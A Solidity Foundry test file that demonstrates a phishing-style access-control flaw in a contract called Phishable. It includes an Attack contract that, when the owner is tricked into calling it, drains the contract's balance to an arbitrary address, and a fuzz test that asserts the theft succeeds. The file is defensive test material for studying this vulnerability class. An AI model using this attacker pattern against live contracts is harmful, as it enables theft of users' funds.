
// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

import {Test} from "../lib/forge-std/src/Test.sol";
import {Phishable} from "../src/Phishable.sol";

contract Attack {
    Phishable public phishable;

    constructor(Phishable _phishable) {
        phishable = _phishable;
    }

    function attack(address recipient) public {
        phishable.withdrawAll(payable(recipient));
    }
}

contract TestAccessControlPhishable is Test {
    Phishable public phishable;
    address public owner;

    function setUp() public {
        owner = vm.addr(1);
        phishable = new Phishable(owner);
    }

    function test_highlightArbitraryUserCanAccess(address caller, uint256 amount) public {
        
        // --- 1. Constraints ---
        vm.assume(caller != address(this));
        vm.assume(caller != address(0));
        vm.assume(caller != address(vm)); 
        vm.assume(caller != 0x000000000000000000636F6e736F6c652e6c6f67);
        vm.assume(caller != owner);
        vm.assume(caller != address(phishable));
        vm.assume(amount > 0);
        vm.assume(amount <= 1e18);

        // --- 2. State Configuration ---
        vm.deal(address(phishable), amount);

        // --- 3. Execution & Assertion ---
        vm.prank(caller);
        Attack attack = new Attack(phishable);

        vm.prank(owner);
        attack.attack(caller);

        assertEq(address(phishable).balance, 0);
        assertEq(caller.balance, amount);
    }
}
